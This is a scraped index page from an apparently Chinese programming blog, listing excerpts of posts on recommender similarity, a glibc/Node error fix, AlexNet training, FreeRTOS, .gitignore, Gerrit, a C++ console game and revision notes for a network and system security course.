jaccard相似度在UserCF中应用示例 import numpy as np import pandas as pd #构建用户购买记录数据集（1买了，0没买） users = ["User1","User2","User3","User4","User5",] items = ["ItemA","ItemB","ItemC","ItemD","ItemE"] datasets = [ [1,0,1,1,0], [1,0,0,1,1], [1,0,1,0,0], [0,1,0,1,1], [1,1,1,0,1] ] df = pd.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18be5171d3f88ee7834d42d738be8245/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45807605bbc4a801d4fe2e04fef6254f/" rel="bookmark">
			前端-内容目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前端-内容目录
（1）前端与后端的技术通性（JDK、JVM、V8、Nodejs、Maven、npm、yarn、webpack、maven package）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67dea3977db201c1daff36f8fd93bf9f/" rel="bookmark">
			Error(25) 解决node: /lib64/libm.so.6: version `GLIBC_2.27‘ not found (required by node)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 tips: 建议不要轻易改这个，感觉有坑… 一般正常服务器也不会出现这个问题，我这里是由于局域网的虚拟机出现此问题；建议操作前存个快照。
node: /lib64/libm.so.6: version `GLIBC_2.27' not found (required by node) node: /lib64/libc.so.6: version `GLIBC_2.25' not found (required by node) node: /lib64/libc.so.6: version `GLIBC_2.28' not found (required by node) node: /lib64/libstdc++.so.6: version `CXXABI_1.3.9' not found (required by node) node: /lib64/libstdc++.so.6: version `GLIBCXX_3.4.20' not found (required by node) node: /lib64/libstdc++.so.6: version `GLIBCXX_3.4.21' not found (required by node) # 查看系统内安装的glibc版本 strings /lib64/libc.so.6 |grep GLIBC_ 解决 cd /root # 编译安装 wget http://ftp.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67dea3977db201c1daff36f8fd93bf9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c17dee536cefe352b3fb1960386dcc91/" rel="bookmark">
			前端与后端的技术通性
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、后端的JDK相当于前端的Node.js, 后端的JVM相当于前端的V8引擎【作用示例图，如下所示】
【Nodejs、JDK分别是前后端的运行环境】
二、后端的Maven（基于项目对象模型-Project Object Model-POM的项目管理机制）相当于前端的npm（node package manager）
【npm、Maven分别是前后端的包管理工具】
三、后端的maven package命令相当于前端的webpack
【webpack、maven package分别是前后端的打包工具】
打包的必要性
打包从来都不是必须的，但前端，几乎不可以不用
————————————————————————————————————————————
打包的过程
————————————————————————————————————————————
打包的功能
————————————————————————————————————————————
常用的打包工具：
————————————————————————————————————————————
webpack简介：
————————————————————————————————————————————
maven package：
提供一套标准的构建流程 → Lifecycle（default、clean两个生命周期，可以并用） → phase（maven package是default生命周期中的一个phase）
————————————————————————————————————————————
maven default生命周期
————————————————————————————————————————————
maven clean生命周期
————————————————————————————————————————————
Lifecycle、phase、goal三者之间的关系
————————————————————————————————————————————
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3dbef25745030b3a30003c5f8e4ec08c/" rel="bookmark">
			如何在colab上打开别人github上推理的ipynb文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、打开如下网址https://colab.research.google.com/github/https://colab.research.google.com/github/2、你将会进入到这个界面
3、从github上复制你需要运行的ipynb文件路径
4、粘贴到2中
OK，你可以开始运行你copy的文件啦
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46a6e2ce36c6269fc1455ccdf3348469/" rel="bookmark">
			【网络与系统安全】国科大《网络与系统安全》复习大纲整理 &#43; 考试记忆版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		国科大荆继武《网络与系统安全》复习整理笔记
重在理解概念考试不算太难 文章目录 一、新形势安全面临挑战和安全保障能力提升二、网络与系统安全的需求与目标三、自主与强制访问控制1.访问控制的基本概念2.访问控制的要素3.访问控制3种基本类型4.访问控制矩阵、访问控制列表、访问控制能力和安全标签5.自主访问控制和强制访问控制6.BLP、BIBA模型（MAC）7.Linux的UGO访问控制原理 四、基于属性的访问控制1.基于属性的访问控制（ABAC）2.SELinux：基于类型的访问控制，安全上下文； 五、网络边界与防护1.IPSEC协议的两个基本协议：AH和ESP2.IPSEC 的两个工作模式：传输模式和隧道模式3.TLS协议握手过程、中间人攻击4.VPN基本原理，VPN技术在TLS和IPSEC层面实现5.防火墙基本原理 六、网络权限管理1.PMI中SOA、AA等实体的作用2.基于属性的访问控制与PMI的关系。3.PKI的基本概念4.PMI缺点 七、系统权限管理1.移动终端系统与传统PC权限管理需求的区别2.Android Permission机制与Linux UGO访问控制的区别与联系3.Android Permission机制实现的基本组件和流程。 八、入侵检测基本原理（全生命周期安全）1.PDR模型的时间关系Pt &gt; Dt + Rt2.入侵检测的技术起源，安全审计3.异常入侵检测和误用入侵检测的区别和联系（考过） 九、入侵响应1.入侵响应2.入侵追踪的基本技术：分布式、多节点协作、网络资源相互信任的基础3.APT攻击对入侵检测与响应的影响（Advanced Persistent Threat） 十、数据备份与灾难恢复1.应急计划的概念（Contingency Plan, CP）2.业务连续性计划的概念，以及业务连续性计划与应急计划的区别和联系3.容灾备份系统的度量指标：RPO，RTO，NRO和DOO 十一、拜占庭容错系统1.n=4，m=1，口头消息的拜占庭消息协商过程2.masking BQS的容错条件，及其一致性过程分析 十二、门限密码学1.密码拆分与门限密码的区别和联系2.拉格朗日差值秘密拆分方案3.RSA门限密码实施过程2.使用proactive recovery 对抗mobile adversary的基本原理 十三、自重构可信赖与终端安全1.美国提出的改变博弈（游戏）规则安全技术包括哪些？2.自重构可信赖与其它安全技术相比最大的安全特征，其带来的安全优势？3.移动终端TEE技术的5个基本安全特征及其含义。（可信执行环境） 十四、可信计算1.可信计算的基本功能2.CRTM和DRTM的概念及区别（信任根）3.TCG软件栈TSS的基本架构和作用（软件）4.BIOS如何与TPM模块交互（硬件）5.完整性度量的应用，比如区块链区块头的完整性保护原理等 十五、安全测评1.信息安全测评体系结构2.密码技术在信息安全和测评体系结构中的作用3.FIPS密码模块测评的基本概念，密码模块的4个级别、5个类别等4.CC检测的基本概念，包括SFR、SAR、EAL等；ST和PP的区别和联系 考试回忆版 一、新形势安全面临挑战和安全保障能力提升 信息技术的发展趋势：融合、扩张、协作；信息安全面临的挑战：隐私、身份、电子依赖、信任绑架、信息财富、边界模糊；信息安全的技术发展趋势：保护(防火墙)、检测(入侵检测)、可生存(入侵容忍)、可信赖(自重构信赖技术)； 二、网络与系统安全的需求与目标 信息安全的基本需求：CIAA； 机密性（Confidentiality）：信息不能被未授权的用户（实体或者进程）知道、使用完整性（Integrity）：数据不能被以未授权或者不可察觉的方式改动可用性（Availability）：确保信息在需要时是可以访问到的真实性（Authenticity）：可认证性，可鉴别性，真实性 信息安全的目标：信息安全风险的概念？从绝对安全到适度安全； 信息安全的目标：控制风险，从绝对安全到适度安全信息安全风险：威胁利用弱点给信息资产造成负面影响的潜在可能 保护阶段的目标：TCSEC橘皮书和CC标准； 目标：提高攻击难度手段：建规则，访问控制 生命周期阶段的保护目标；入侵检测技术；PDCA的概念 生命周期阶段的保护目标： 绝对安全到适度安全 基于时间的安全：敌手攻击时间 &gt; 检测发现攻击的时间 + 应对攻击的时间 入侵检测IDS 功能：监视、评估恶意或者违反安全策略的行为，并产生相应报警核心概念：报警及报警的误报率和漏报率 信息安全管理模型：Plan设计-Do实施-Check分析-Act执行 Plan： 对ISMS范围所及进行风险评估和控制方案设计；Do：对于不可接受风险，实施风险处理计划，比如增加防火墙等安全措施；Check：分析运行效果，寻求改进机会；Act： 经过了评审之后，要执行的进一步动作； 可生存技术：拜占庭容错和门限密码技术；可生存技术的基本原理； 信息系统生存技术关注：计算过程的可靠性和错误容忍。关注：权力集中的消除（消除系统的单点失效），可以抵御外部攻击+内部背叛 自重构可信赖保护技术：动态构建、适度安全、随着任务启动生成保护，随任务结束退出（保护的生与死） 本质：对系统保护弱点的隐藏 三、自主与强制访问控制 1.访问控制的基本概念 通过某种途径准许或者限制访问能力，从而控制对关键资源的访问，防止非法用户的侵入或者合法用户的不慎操作所造成的破坏。
2.访问控制的要素 主体S：资源访问的具体请求者客体O：被访问资源的实体控制策略A：主体对客体的授权行为+客体对主体操作行为的认可 3.访问控制3种基本类型 自主访问控制DAC：DAC允许合法用户以用户或用户组的身份访问策略规定的客体，同时阻止非授权用户访问客体（UGO、ACL）强制访问控制MAC：比DAC更严格，MAC是一种多级访问控制策略，用户和客体具有不同的安全级别，用户不能改变自身和客体的安全级别，只有管理员才能够确定用户和组的访问权限，系统对访问主体和受控对象，按照安全级对应规则实行强制访问控制（BLP、BIBA、SELinux）基于角色的访问控制RBAC：是将访问许可权分配给一定的角色，用户通过饰演不同的角色获得角色所拥有的访问许可权组和角色的区别：组（一组用户的集合） 角色（一组客体操作权限的集合） 4.访问控制矩阵、访问控制列表、访问控制能力和安全标签 访问控制矩阵：授权在一个时间节点的静态抽象表示（坐标(主体,客体)=操作）访问控制列表：目标对象的属性表，给定每个用户对目标的访问权限，适用于少用户（目标固定，=访问控制矩阵的一列）访问控制能力：它授权持有者以特定的方式访问特定的目标，使用少目标（用户固定，=访问控制矩阵的一行）安全标签：支持多级访问控制策略，在访问控制中，一个安全标签隶属于一个用户、一个目标、一个访问请求或传输中的一个访问控制信息。标签的产生和附着个过程必须可信，在处理一个访问请求时，目标环境比较请求上的标签和目标上的标签决定是允许还是拒绝访问。 5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46a6e2ce36c6269fc1455ccdf3348469/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14a2134eb9b0b1ad9d218a741471129e/" rel="bookmark">
			vue&#43;element实现图片上传及裁剪功能（vue-cropper）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求背景： 上传图片或者头像时，能够将图片进行裁剪（等比例缩放裁剪或非等比例裁剪）
效果图： 安装使用 1、安装 npm install vue-cropper // npm 安装
yarn add vue-cropper // yarn 安装 2、引用 // 全局引用 main.js import VueCropper from 'vue-cropper' Vue.use(VueCropper) // 局部引用 import VueCropper from 'vue-cropper' components: { VueCropper }, 3、使用 （我的页面需求是很多地方都需要使用这个裁剪弹窗所以我就将这一整个上传裁剪的模块单独封装起来了，但是把封装起来的代码贴上来就太多了 因为涉及到传值的地方很多，所以看起来会费力点，这里就单独把上传的组件放上来 大家需要封装的话 自己可以把这个模块进行改造）
1、上传按钮：
&lt;!-- element 上传图片按钮 --&gt; &lt;el-upload class="upload-demo" action="" drag :auto-upload="false" :show-file-list="false" :on-change='handleChangeUpload'&gt; &lt;i class="el-icon-upload"&gt;&lt;/i&gt; &lt;div class="el-upload__text"&gt;点击上传&lt;/div&gt; &lt;/el-upload&gt; 2. 设置一个弹出层，放剪裁图片的cropper
&lt;!-- vueCropper 剪裁图片实现--&gt; &lt;el-dialog title="图片剪裁" :visible.sync="dialogVisible" class="crop-dialog" append-to-body&gt; &lt;div class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/14a2134eb9b0b1ad9d218a741471129e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/755e29585ca35f63616d42b3d93d1f3b/" rel="bookmark">
			Mac显示证书不受信任或者无效的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装Apple全球开发者关系认证媒介中间证书AppleWWDRCA
证书链接
https://developer.apple.com/certificationauthority/AppleWWDRCA.cer
https://www.apple.com/certificateauthority/AppleWWDRCAG3.cer
https://www.apple.com/certificateauthority/AppleWWDRCAG4.cer
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cf1681b9143e347465479f426005166/" rel="bookmark">
			.gitignore 忽略文件和目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. .gitignore 简介2. .gitignore 注释3. / 开头或结尾的忽略4. glob 模式匹配忽略5. .gitignore 全局忽略6. 忽略已提交到远程仓库的内容7. 使用各种框架下的忽略规则 1. .gitignore 简介
.gitignore 文件的作用就是告诉 git 哪些文件不需要添加到版本管理中（定义忽略提交的文件）
.gitignore 文件用来忽略被指定的文件或文件夹的改动，被记录在.gitignore文件里的文件或文件夹，是无法被 git 跟踪到的，换句话说，被忽略的文件是不会被放入到远程仓库里的。
也就是说，如果文件已经存在于远程仓库中，是无法通过 .gitignore 文件来忽略的
2. .gitignore 注释
所有空行或者以注释符号 ＃ 开头的行都会被 git 忽略
以井号(#)开头的行是注释，将被忽略，空行可用于提高文件的可读性并对相关的模式行进行分组
# 忽略编辑器配置目录/.idea/.vscode 3. / 开头或结尾的忽略
之前在某篇文章中看到这句话: 以斜杠 / 开头表示忽略的是目录
后来发现并不是这样的，它真正的作用是只忽略同级的内容，而不忽略下级目录中的内容
结论: / 位于头部的作用是只忽略当前目录下的内容；放在尾部的作用是只忽略目录，而不忽略文件
头尾都没有 /
# 忽略当前目录及下级目录中所有的 runtime# runtime 文件或目录都会被忽略runtime 前面有 /
# 只忽略当前目录中的 runtime 文件或目录# 不忽略下级目录中的 runtime 文件或目录/runtime 后面有 /
# 只忽略当前目录和下级目录中的 runtime 目录# 不忽略当前目录和下级目录中的 runtime 文件runtime/ 头尾都有 /
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5cf1681b9143e347465479f426005166/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/435f6795db683b73145816342c3eba30/" rel="bookmark">
			写一个批处理：将子文件夹内的文件移动到当前目录下
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、新建文件.bat：
@echo off for /r %%i in (*) do ( rem echo %%~nxi move %%i %~dp0/%%~nxi ) echo %~dp0 pause 本质上也只有：
@echo off for /r %%i in (*) do ( move %%i %~dp0/%%~nxi ) pause 当然了，如果我们想指定移动的文件可以这样写：
@echo off for /r %%i in (*.txt) do ( move %%i %~dp0/%%~nxi ) pause 最后，需要注意的是，复制的代码，应该保存在ANSI格式的文本中。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1db67481f9b89742ec9eaf936e3b8299/" rel="bookmark">
			ASP.NETCore
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0. ASP.NETCore 介绍 ASP.NETCore是一个新的开源和跨平台的框架，用于构建如Web应用、物联网（IoT)应用和移动后端应用等连接到互联网的基于云的现代应用程序。ASP.NET Core应用可运行于.NET Core和完整的.NET Framework之上。构建它的目的是为那些部署在云端或者内部运行的应用提 供一个优化的开发框架。它由最小开销的模块化的组件构成，因此在构建解决方案的同时可以 保持灵活性。我们可以在Windows、Mac和Linux上跨平台开发和运行自己的ASP.NET Core 应用。
ASP.NETCore 开源在 GitHub 上。ASP.NET Core有一些架构上的改变，这些改变使得它成为一个更为精简并且模块化的框架。ASP.NET Core不再基于System.Web.dll。当前它基于一系列颗粒化的，并且有良好构建的 NuGet包。这一特点能够让你通过仅仅包含需要的NuGet包的方法来优化你的应用。一个更小 的应用程序接口通过“只为你需要的功能付出”（pay-for-what-you-use)模型获得的好处包括: 可靠的安全性、简化服务、改进性能和减少成本。
通过ASP.NET Core可以获得的改进如下：
一个统一的方式用于构建Web UI和Web APIs。
集成现代的客户端开发框架和开发流程。
一个适用于云的，基于环境的配置系统。
内置的依赖注入。
新型的、轻量级的、模块化HTTP请求管道。
运行于IIS或者自宿主（self_host)于你自己的进程的能力。
基于支持真正的side-by-side应用程序版本化的.NET Core构建。
完全以NuGet包的形式发布。
新的用于简化现代Web开发的工具。
可以在Windows、Mac和Linux上构建和运行跨平台的ASP.NET应用。
开源并且重视社区。
1. ASP.NETCore 应用 使用VS 2017新建一个Web应用，打开VS 2017创建一个新的解决方案，在解决方案中新建一个项目，在添加新项目窗口中选择 .NET Core，选择ASP.NETCore Web应用程序，如下图所示：
这里的实例我们使用 Web Application (MVC) 框架版本为 .NET Core 2.1 如下图所示：
选择ASP.NET Core 项目模板
一个ASP.NET Core 应用其实就是在 Program 类的 Main方法调用 WebHost.CreateDefaultBuilder方法，创建了一个默认的Web应用程序宿主（Web服务器）。相比于.NET Core 1.0 在.NET Core 2.x 少了许多配置，新的方式已经隐藏了很多细节， 在WebHost.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1db67481f9b89742ec9eaf936e3b8299/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e2a6260e87dd1d19d9eee6a31ee5fbf/" rel="bookmark">
			使用Alexnet实现CIFAR100数据集的训练
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果对你有用的话，希望能够点赞支持一下，这样我就能有更多的动力更新更多的学习笔记了。😄😄 使用Alexnet进行CIFAR-10数据集进行测试，这里使用的是将CIFAR-10数据集的分辨率扩大到224X224，因为在测试训练的时候，发现将CIFAR10数据集的分辨率拉大可以让模型更快地进行收敛，并且识别的效果也是比低分辨率的更加好。
首先来介绍一下，Alexnet:
1.论文下载地址：http://www.cs.toronto.edu/~fritz/absps/imagenet.pdf
2.Alexnet的历史地位：
①在ILSVRC-2010和ILSVRC-2012比赛中，使用ImageNet数据集的一个子集，训练了一个最大的卷积神经网络，并且在该数据集取得相对于现在来说很好的结果。
②完成高度优化的GPU实现，用于2D卷积和训练神经网络的操作，并将其公开。
③使用了一些技巧（ReLu、多块GPU并行训练、局部响应归一化、Overlapping池化、Dropout等），能够改善性能、减少训练时间。
3.Alexnet的网络结构图（使用了两个GPU，所以网络的结构是分开进行画出来的）：
​
4.代码实现：
数据集的处理：
调用torchvision里面封装好的数据集（CIFAR100）进行数据的训练，并且利用官方已经做好的数据集分类（using 50000 images for training, 10000 images for validation）是数据集的划分大小。进行了一些简单的数据增强，分别是随机的随机剪切和随机的水平拉伸操作。
模型的代码结构目录：
​
data:进行模型训练的时候会自动开始下载数据集的信息到这个文件夹里面。
res:该文件夹会保存模型的权重和记录模型在训练过程当中计算出来的train_loss, train_acc和val_acc做成的xml文件夹。
train.py代码如下:
# -*- coding:utf-8 -*- # @Time : 2023-01-10 19:08 # @Author : DaFuChen # @File : CSDN写作代码笔记 # @software: PyCharm import torchvision from model import AlexNet import os import parameters import torch import torch.nn as nn import torch.optim as optim from torchvision import transforms from tqdm import tqdm from fuction import writer_into_excel_onlyval def main(): device = torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e2a6260e87dd1d19d9eee6a31ee5fbf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/417a31aa9d39c0c76651ebd4d7431b44/" rel="bookmark">
			使用Alexnet实现CIFAR10数据集的训练
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果对你有用的话，希望能够点赞支持一下，这样我就能有更多的动力更新更多的学习笔记了。😄😄 使用Alexnet进行CIFAR-10数据集进行测试，这里使用的是将CIFAR-10数据集的分辨率扩大到224X224，因为在测试训练的时候，发现将CIFAR10数据集的分辨率拉大可以让模型更快地进行收敛，并且识别的效果也是比低分辨率的更加好。
首先来介绍一下，Alexnet:
1.论文下载地址：http://www.cs.toronto.edu/~fritz/absps/imagenet.pdf
2.Alexnet的历史地位：
①在ILSVRC-2010和ILSVRC-2012比赛中，使用ImageNet数据集的一个子集，训练了一个最大的卷积神经网络，并且在该数据集取得相对于现在来说很好的结果。
②完成高度优化的GPU实现，用于2D卷积和训练神经网络的操作，并将其公开。
③使用了一些技巧（ReLu、多块GPU并行训练、局部响应归一化、Overlapping池化、Dropout等），能够改善性能、减少训练时间。
3.Alexnet的网络结构图（使用了两个GPU，所以网络的结构是分开进行画出来的）：
4.代码实现：
数据集的处理：
调用torchvision里面封装好的数据集（CIFAR10）进行数据的训练，并且利用官方已经做好的数据集分类（using 50000 images for training, 10000 images for validation）是数据集的划分大小。进行了一些简单的数据增强，分别是随机的随机剪切和随机的水平拉伸操作。
模型的代码结构目录：
data:进行模型训练的时候会自动开始下载数据集的信息到这个文件夹里面。
res:该文件夹会保存模型的权重和记录模型在训练过程当中计算出来的train_loss, train_acc和val_acc做成的xml文件夹。
train.py代码如下:
import torchvision from model import AlexNet import os import parameters import torch import torch.nn as nn import torch.optim as optim from torchvision import transforms from tqdm import tqdm from fuction import writer_into_excel_onlyval def main(): device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu") print("using {} device.".format(device)) epochs = parameters.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/417a31aa9d39c0c76651ebd4d7431b44/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53c3f836a24d3a2b82e0ef25c0e7efe6/" rel="bookmark">
			3、基于STM32CubeMX的FreeRTOS移植——第三章【FreeRTOS任务管理】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、FreeRTOS的任务1.FreeRTOS多任务机制2.任务的状态3.任务的优先级3.空闲任务 二、FreeRTOS的任务调度1.概述2.宏定义参数3.任务管理函数 三、创建多任务例程1、CubeMX配置1.GPIO配置2.时钟源和时钟树配置3.移植FreeRTOS4.在FreeRTOS中添加任务5.生成代码 四、代码分析1.main.c2.freertos.c3.功能分析 一、FreeRTOS的任务 1.FreeRTOS多任务机制 在 FreeRTOS 中，任务调度器会不断地扫描所有的任务，选择具有最高优先级的就绪任务来运行。当有新任务就绪或者当前任务完成时，调度器会再次扫描任务，选择下一个就绪任务来运行。这种运行方式叫做"任务轮转"。
在任务调度器切换任务时，会进行上下文切换。上下文切换会在切换前和切换后保存和恢复 CPU 寄存器状态，并在切换后切换新任务的堆栈。这样可以保证每个任务的状态和环境不受其它任务的影响。
此外 FreeRTOS 也提供了可重入的调度器函数，如xTaskIncrementTick，在处理硬件定时器或中断时使用。这种机制可以让中断和任务在上下文切换时进行切换。
通过上述机制，FreeRTOS能支持在单核CPU上多任务并行运行，各个任务相互独立，互不影响，调度策略满足系统要求，实现了多任务并发处理。
2.任务的状态 就绪状态 (Ready)：任务已经创建，并且可以被调度器运行。当任务被创建时，它处于就绪状态。
运行状态 (Running)：当前在 CPU 上运行的任务。只有一个任务能处于运行状态。
阻塞状态 (Blocked)：任务被阻塞了，不能被调度器运行。当任务执行阻塞操作时，如等待信号量、邮箱、消息队列等，它将进入阻塞状态。
挂起状态 (Suspended)：任务被挂起了，不能被调度器运行。当任务被调用 vTaskSuspend() 挂起时，它将进入挂起状态。
删除状态 (Deleted)：任务已被删除，不能被调度器运行。当任务调用 vTaskDelete() 或者调度器自动删除任务时，它将进入删除状态。
任务状态的转换由调度器控制。例如：一个任务从就绪状态转换到运行状态，当前运行的任务从运行状态转换到就绪状态，调用阻塞函数的任务从就绪状态转换到阻塞状态。
3.任务的优先级 FreeRTOS 中每个任务都有一个优先级。优先级越高的任务越容易被调度器选中，被分配到更多的 CPU 时间。
FreeRTOS 使用优先级调度算法来确定哪个任务应该在 CPU 上运行。当任务调度器每次被调用时，它会扫描所有就绪任务，选择具有最高优先级的任务来运行。
默认情况下，FreeRTOS 使用升序优先级调度算法，即优先级越高，值越小。其中默认最低优先级为0，最高优先级为(configMAX_PRIORITIES-1)。
开发人员可以使用函数 xTaskCreate() 来创建新任务并指定其优先级，也可以使用函数vTaskPrioritySet()更改已有任务的优先级。
在实际应用中，优先级需要结合系统的实际需求进行设置，确保每个任务都能得到足够的运行时间，确保系统的正常运行。
3.空闲任务 FreeRTOS 中有一个特殊的任务叫做空闲任务 (Idle task)。这个任务是由 FreeRTOS 自动创建的，它的优先级是最低的，并且当所有其它任务都处于阻塞状态时，调度器会自动切换到这个任务上运行。
空闲任务的主要目的是在系统空闲时执行后台操作，如调整 CPU 的频率，执行计数器或收集统计信息等。
可以通过实现 xApplicationIdleHook() 函数来指定空闲任务的具体行为，以实现自己的空闲处理逻辑。此函数在空闲任务调用时运行。此函数的默认实现为空函数，如果没有被重定义，空闲任务就不会执行其他任何操作。
需要注意的是，空闲任务会一直运行，因此需要保证它不会占用过多 CPU 资源，否则可能会影响其它任务的调度。
空闲任务作为系统级别的任务提供资源回收及其他一些系统维护操作，比如进行资源回收或者统计系统信息等操作，它在系统处理能力充足时可以满足效率要求，如果在系统空闲时间很多的时候会成为系统的瓶颈。
二、FreeRTOS的任务调度 1.概述 FreeRTOS 使用任务调度器 (task scheduler) 来管理和调度任务。当系统中有新的任务就绪或者当前任务完成时，调度器会被唤醒，选择下一个就绪任务来运行。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53c3f836a24d3a2b82e0ef25c0e7efe6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa8da8b92b731207112e1a10eee73184/" rel="bookmark">
			移除元素(数组)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题
给你一个数组 nums 和一个值 val，你需要 原地 移除所有数值等于 val 的元素，并返回移除后数组的新长度。
不要使用额外的数组空间，你必须仅使用 O(1) 额外空间并原地修改输入数组。
元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。
示例 1: 给定 nums = [3,2,2,3], val = 3, 函数应该返回新的长度 2, 并且 nums 中的前两个元素均为 2。 你不需要考虑数组中超出新长度后面的元素。
示例 2: 给定 nums = [0,1,2,2,3,0,4,2], val = 2, 函数应该返回新的长度 5, 并且 nums 中的前五个元素为 0, 1, 3, 0, 4。
你不需要考虑数组中超出新长度后面的元素
解决
/** * 删除一个数组中的等于目标值的元素，返回剩余元素，而且不能使用其他的空间 * 原因：数组的元素在内存地址中是连续的，不能单独删除数组中的某个元素，只能覆盖。 * 数组不像链表可以随便的增加删除，数组一修改就需要将所有的数据都一个个挪过来 */ // 双指针法 时间复杂度：O(n) 空间复杂度：O(1) public static int removeElement(int[] nums, int var) { int n = nums.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa8da8b92b731207112e1a10eee73184/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8993f6a9a9c67f61b17778916abdf406/" rel="bookmark">
			c&#43;&#43;小游戏（附源码）（可转载）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家可以看到，这个代码复制非常不方便，所以我重新做了一个，点一下就可以复制，链接在这里：点击这里 ​#include&lt;bits/stdc++.h&gt;
#include &lt;cstdio&gt;
#include &lt;conio.h&gt;
#include &lt;cstdlib&gt;
#include &lt;cstring&gt;
#include &lt;fstream&gt;
#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;algorithm&gt;
#include&lt;sys/time.h&gt;
#define REP(i,a,b) for (int i=(a);i&lt;=(b);i++)
#define PER(i,a,b) for (int i=(a);i&gt;=(b);i--)
#define max(x,y) ((x)&lt;(y)?(y):(x))
#define min(y,x) ((x)&lt;(y)?(x):(y))
#define MEM(a,b) memset(a,(b),sizeof(a))
#define KEY_DOWN(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) &amp; 0x8000) ? 1:0)//判断这个键是否按下
#define KEY_UP(VK_NONAME) ((GetAsyncKeyState(VK_NONAME) &amp; 0x8000) ? 0 : 1)//判断这个键是否弹起
#define KEY_EVERY(lpkeyState) GetKeyboardState(lpKeyState)//获得所有的256个键（键盘按键、鼠标按键等等）的状态，lpKeyState是指向一个256bit的数组，存放所有键的状态。
#define KEY_NOW(nVirtKey) GetKeyState(nVirtKey)//用于判断nVirtKey的状态。用返回值的最高位表示，最高位为1表示当前键处于down的状态；最高位为0当前键处于up状态。此函数从消息队列中读取消息进行处理。
#define setcolor(x) SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),x)//设置颜色
#define getkey(x) GetAsyncKeyState(x)
#define GetWindow() GetForegroundWindow();//得到窗口信息
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8993f6a9a9c67f61b17778916abdf406/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9716d2ea6dd4b4295591e0ce91bf835/" rel="bookmark">
			gerrit用户代码审核提交流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		gerrit代码审核提交流程 简介注册gerrit用户注册账户邮箱配置秘钥1.获取秘钥2.设置秘钥 开发人员1.拉取项目2.修改提交项目3.增加审核人员审核结果 审核人员审核提交查看审核确认 QAQ总结1.提交被打回2.提交后发生冲突3.push服务端是失败4.推送出现权限问题 简介 Gerrit，一种免费、开放源代码的代码审查软件，使用网页界面。利用网页浏览器，同一个团队的软件程序员，可以相互审阅彼此修改后的程序代码，决定是否能够提交，退回或者继续修改。
本文主要记录一个gerrit的用户如何拉取代码，并做修改提交，等待审核的一个过程。
如果你是一个刚接触gerrit的用户使用者，可以继续往下阅读。如果你已经是一名old bird可以忽略~~~
